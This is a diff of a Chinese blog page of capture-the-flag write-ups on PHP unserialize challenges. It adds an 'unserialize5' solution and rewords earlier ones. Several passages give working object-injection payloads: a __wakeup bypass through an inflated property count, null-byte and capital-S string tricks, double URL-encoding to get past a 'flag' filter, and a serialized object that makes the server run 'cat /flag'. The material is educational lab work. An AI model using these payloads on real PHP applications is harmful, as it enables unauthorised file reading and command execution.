@@ -325,7 +325,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-11-09 21:47:09" itemprop="dateModified" datetime="2020-11-09T21:47:09+08:00">2020-11-09</time>
+                <time title="修改时间：2020-11-13 20:05:04" itemprop="dateModified" datetime="2020-11-13T20:05:04+08:00">2020-11-13</time>
               </span>
 
           
@@ -359,10 +359,10 @@
 
 
 
-<h2 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h2><p>这行代码是显示源码的意思；</p>
+<h2 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h2><p>显示源代码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure>
 
-<p>没有XianZhi对象我们可以new一个XianZhi对象出来然后再将对象赋值给一个变量，代码如下：</p>
+<p>new出对象XianZhi并赋值给变量$a</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; new XianZhi()；</span><br></pre></td></tr></table></figure>
 
 <p>非常典型的一个反序列函数，通过get的方式传进来；</p>
@@ -385,10 +385,10 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">47.98.234.232:28067&#x2F;var&#x3D;TzorNDoiRGVtbyI6KzI6e3M6MTA6IgBEZW1vAGZpbGUiO3M6MTY6ImYxNWdfMXNfaGVyZS5waHAiO30&#x3D;</span><br></pre></td></tr></table></figure>
 
 <p>访问即可夺旗</p>
-<h2 id="题目解析-1"><a href="#题目解析-1" class="headerlink" title="题目解析"></a>题目解析</h2><p>访问源码的意思；</p>
+<h2 id="题目解析-1"><a href="#题目解析-1" class="headerlink" title="题目解析"></a>题目解析</h2><p>访问源代码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(&quot;index.php&quot;);</span><br></pre></td></tr></table></figure>
 
-<p>_wakeup的作用是使用反序列函数时触发，也就是说当我们使用反序列化时就会直接运行下面的代码，如果说这个file属性这个值不是index就会强行转换为index这个值；</p>
+<p>_wakeup的作用是使用反序列函数时触发，就是说当我们使用反序列化时就会直接运行下面的代码，如果说这个file属性这个值不是index就会强行转换为index这个值；</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function __wakeup() &#123;</span><br><span class="line">        if ($this-&gt;file !&#x3D; &#39;index.php&#39;) &#123;</span><br><span class="line">            &#x2F;&#x2F;the secret is in the f15g_1s_here.php</span><br><span class="line">            $this-&gt;file &#x3D; &#39;index.php&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 <p>对我们传进来的东西进行了过滤，我们传进来的东西必须要被base64编码的；</p>
@@ -406,10 +406,10 @@
 <p>将对象字符串化再赋值给变量$payload</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$payload &#x3D; serialize($a);</span><br></pre></td></tr></table></figure>
 
-<p>为了绕过正则匹配和_wake，第一行是将正则匹配的东西给替换从而绕过，第二行是再次替换，利用php5.5之前的漏洞当我们序列化的对象里面的属性大于它真实的值的时候它会绕过wake去执行，一定要绕过wake，否则无法访问目标文件进行夺旗；</p>
+<p>为了绕过正则匹配和_wake，第一行是将正则匹配到的东西给替换从而绕过，第二行替换，是利用php5.5之前的漏洞当我们序列化的对象里面的属性大于它真实的值的时候它会绕过wake去执行；</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$payload &#x3D; str_replace(&#39;:4&#39;, &quot;:+4&quot;, $payload);</span><br><span class="line">$payload &#x3D; str_replace(&#39;:1:&#39;, &quot;:+2:&quot;, $payload);</span><br></pre></td></tr></table></figure>
 
-<p>输出变量$payload并对它进行base64编码；</p>
+<p>变量$payload进行base64编码，然后打印；</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo base64_encode($payload);</span><br></pre></td></tr></table></figure>
 
 
@@ -424,15 +424,15 @@
 
 <p>就会得到一个带有不可见字符的payload，</p>
 <p><img src="https://i.loli.net/2020/11/06/YP3ogdrz6Lp5tRf.png" alt="1604661092726.png"></p>
-<p>将该payload中的不可见字符改成\00，即如下：</p>
+<p>将该payload的不可见字符改成\00，将s改为S，如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;S:5:&quot;&#x2F;flag&quot;;s:10:&quot;\00*\00content&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>然后再用get方式传输，即可夺旗；</p>
-<h2 id="题目解析-2"><a href="#题目解析-2" class="headerlink" title="题目解析"></a>题目解析</h2><p>查看源代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
-
-<p>如果op等于2就会强制转化成1</p>
+<h2 id="题目解析-2"><a href="#题目解析-2" class="headerlink" title="题目解析"></a>题目解析</h2><p>如果op等于2就会强制转化成1，但三个等号还会比较数据类型是否一致，“2”是字符串，2是int型，所以可以直接让op等于2进行绕过；</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;)</span><br><span class="line">            $this-&gt;op &#x3D; &quot;1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>限制不可见字符，导致无法url编码绕过；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function is_valid($s) &#123;</span><br><span class="line">    for($i &#x3D; 0; $i &lt; strlen($s); $i++)</span><br><span class="line">        if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125))</span><br><span class="line">            return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>如果/flag被过滤了，我们可以用16进制来代替它；</p>
 <p>在sublime软件中输入代码：</p>
@@ -458,20 +458,47 @@
 <p> 表示受保护的，只有本类或子类或父类中可以访问 ，不可以在类外访问</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protected $a;</span><br></pre></td></tr></table></figure>
 
-<p> strpos() 函数查找字符串在另一字符串中第一次出现的位置，如果在$a中找到flag，$b就会被赋值就会die掉，所以我们不能让$b赋值，也就是说我们不可以让它在$中招到flag，我们需要对它进行编码处理；</p>
+<p> strpos() 函数查找字符串在另一字符串中第一次出现的位置，如果在$a中找到flag，$b就会被赋值就会die掉，所以我们不能让$b赋值，也就是说我们不可以让它在$中招到flag，我们需要对它进行url编码处理；</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$b &#x3D; strpos($this-&gt;a, &#39;flag&#39;);</span><br><span class="line">        if($b) &#123;</span><br><span class="line">            die(&quot;Bye!&quot;);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
 
 <h2 id="解题方法-3"><a href="#解题方法-3" class="headerlink" title="解题方法"></a>解题方法</h2><p>将代码改成：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">class Hello &#123;</span><br><span class="line">    protected $a&#x3D;&#39;file：&#x2F;&#x2F;&#x2F;f%25%36%63ag&#39;;&#x2F;&#x2F;表示受保护的，只有本类或子类或父类中可以访问</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">$o &#x3D; new Hello();</span><br><span class="line">$d &#x3D; serialize($o).&quot;\n&quot;; </span><br><span class="line">echo $d;</span><br></pre></td></tr></table></figure>
 
 <p>这里将 “ l ”url编码了两次，get传参会进行一次url编码，所以要进行两次编码，这里只要将flag中的字母随意进行url编码即可。</p>
-<p>运行代码得到payload，这里的不可见字符改成\00,字符长度22要改为14，%25， %36和 %63算一个字符长度，\00要变成%00（\00就是16进制的chr（0），%00是chr(0)的url编码，要二次编码），s要改为S（大写）才可以进行url编码，否则无法识别。</p>
+<p>运行代码得到payload，这里的不可见字符改成%00,字符长度22要改为14，%25， %36和 %63算一个字符长度，（\00就是16进制的chr（0），%00是chr(0)的url编码，要二次编码），s要改为S（大写）才可以进行url编码，否则无法识别。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;Hello&quot;:1:&#123;S:4:&quot;%00*%00a&quot;;S:14:&quot;file:&#x2F;&#x2F;&#x2F;f%25%36%63ag&quot;;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>在地址栏上输入</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.98.234.232:28083&#x2F;?z&#x3D;O:5:%22Hello%22:1:&#123;S:4:%22%00*%00a%22;S:14:%22file:&#x2F;&#x2F;&#x2F;f%25%36%63ag%22;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>即可夺旗；</p>
+<h1 id="unserialize5"><a href="#unserialize5" class="headerlink" title="unserialize5"></a>unserialize5</h1><p>题目代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class home</span><br><span class="line">&#123;</span><br><span class="line">    private $method;</span><br><span class="line">    private $args;</span><br><span class="line">    function __construct($method, $args)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;method &#x3D; $method;</span><br><span class="line">        $this-&gt;args &#x3D; $args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if (in_array($this-&gt;method, array(&quot;mysys&quot;))) &#123;</span><br><span class="line">            call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mysys($path)</span><br><span class="line">    &#123;</span><br><span class="line">        print_r(base64_encode(exec(&quot;cat $path&quot;)));</span><br><span class="line">    &#125;</span><br><span class="line">    function waf($str)</span><br><span class="line">    &#123;</span><br><span class="line">        if (strlen($str) &gt; 8) &#123;</span><br><span class="line">            die(&quot;No&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        return $str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $num &#x3D; 0;</span><br><span class="line">        foreach ($this-&gt;args as $k &#x3D;&gt; $v) &#123;</span><br><span class="line">            $this-&gt;args[$k] &#x3D; $this-&gt;waf(trim($v));</span><br><span class="line">            $num +&#x3D; 1;</span><br><span class="line">            if ($num &gt; 2) &#123;</span><br><span class="line">                die(&quot;No&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($_GET[&#39;path&#39;]) &#123;</span><br><span class="line">    $path &#x3D; @$_GET[&#39;path&#39;];</span><br><span class="line">    unserialize($path);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="题目解析-3"><a href="#题目解析-3" class="headerlink" title="题目解析"></a>题目解析</h2><p>加一个@作用：不显示错误；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$path &#x3D; @$_GET[&#39;path&#39;];</span><br></pre></td></tr></table></figure>
+
+
+
+<p>因为我们只是array（”/flag”）一个值，num=1不会大于2，长度不会大于8，所以对解题没有限制；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function waf($str)</span><br><span class="line">    &#123;</span><br><span class="line">        if (strlen($str) &gt; 8) &#123;</span><br><span class="line">            die(&quot;No&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        return $str;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $num &#x3D; 0;</span><br><span class="line">        foreach ($this-&gt;args as $k &#x3D;&gt; $v) &#123;</span><br><span class="line">            $this-&gt;args[$k] &#x3D; $this-&gt;waf(trim($v));</span><br><span class="line">            $num +&#x3D; 1;</span><br><span class="line">            if ($num &gt; 2) &#123;</span><br><span class="line">                die(&quot;No&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>题目可以简化成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class home</span><br><span class="line">&#123;</span><br><span class="line">    private $method;</span><br><span class="line">    private $args;</span><br><span class="line">    function __construct($method, $args)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;method &#x3D; $method;</span><br><span class="line">     &#x2F;&#x2F;让$method &#x3D;$_method，是两个不同的变量，_只是用来区别两个不同的变量，让我们可以直接用$method</span><br><span class="line">        $this-&gt;args &#x3D; $args;</span><br><span class="line">     &#x2F;&#x2F;让$args &#x3D;$_args，是两个不同的变量，让我们可以直接用$args</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if (in_array($this-&gt;method, array(&quot;mysys&quot;)))</span><br><span class="line">        &#x2F;&#x2F;判断传回来的数组有没有mysys，然后执行回调函数</span><br><span class="line">        &#123;</span><br><span class="line">            call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);</span><br><span class="line">            &#x2F;&#x2F;回调函数，为了调用mysys,$this创建一个空的对象</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mysys($path)</span><br><span class="line">    &#123;</span><br><span class="line">        print_r(base64_encode(exec(&quot;cat $path&quot;)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>执行这个函数就可以cat $path，$path是可以控制的，让$path=”/flag”,就可以cat flag，因为base64编码了，所以后面我们要base64解码一下；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function mysys($path)</span><br><span class="line">   &#123;</span><br><span class="line">       print_r(base64_encode(exec(&quot;cat $path&quot;)));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="解题方法-4"><a href="#解题方法-4" class="headerlink" title="解题方法"></a>解题方法</h2><p>改代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class home</span><br><span class="line">&#123;</span><br><span class="line">    private $method;</span><br><span class="line">    private $args;</span><br><span class="line">    function __construct($method, $args)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;method &#x3D; $method;&#x2F;&#x2F;$method&#x3D;$_method；</span><br><span class="line">        $this-&gt;args &#x3D; $args;&#x2F;&#x2F;$args&#x3D;$_args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o &#x3D; new home(&quot;mysys&quot;,array(&quot;&#x2F;flag&quot;));</span><br><span class="line"></span><br><span class="line">$a &#x3D; serialize($o);</span><br><span class="line"></span><br><span class="line">$a &#x3D;urlencode($a);</span><br><span class="line"></span><br><span class="line">print_r($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>运行得到payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22home%22%3A2%3A%7Bs%3A12%3A%22%00home%00method%22%3Bs%3A5%3A%22mysys%22%3Bs%3A10%3A%22%00home%00args%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A5%3A%22%2Fflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>
+
+<p>get传参，再将得到的一串字符 <strong>ZmxhZ3tkMzJhMWE1OS03NmM2LTRiOGItYWU4ZC01YzIzYmU3MjI4YjJ9</strong> </p>
+<p>base64解码一下得到<strong>flag{d32a1a59-76c6-4b8b-ae8d-5c23be7228b2}</strong></p>
 <h1 id="解题中的知识"><a href="#解题中的知识" class="headerlink" title="解题中的知识"></a>解题中的知识</h1><h2 id="设置Sublime软件中可以运行代码"><a href="#设置Sublime软件中可以运行代码" class="headerlink" title="设置Sublime软件中可以运行代码"></a>设置Sublime软件中可以运行代码</h2><p>一，打开平时所用的php版本根目录，并复制此地址；例如：D:\phpStudy\PHPTutorial\php\php-5.4.45-nts</p>
 <p><img src="https://i.loli.net/2020/11/05/qCQgokfKpHBE5Pr.png" alt="1604568992092.png"></p>
 <p>二，右击此电脑，打开属性，点击高级系统设置，打开环境变量，点击系统变量的path变量将上一步复制的地址写进去；</p>
@@ -1396,7 +1423,7 @@ $(document).ready(function() {
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共7.9k字</span>
+  <span class="post-count">博客全站共8.6k字</span>
 </div>
 
         
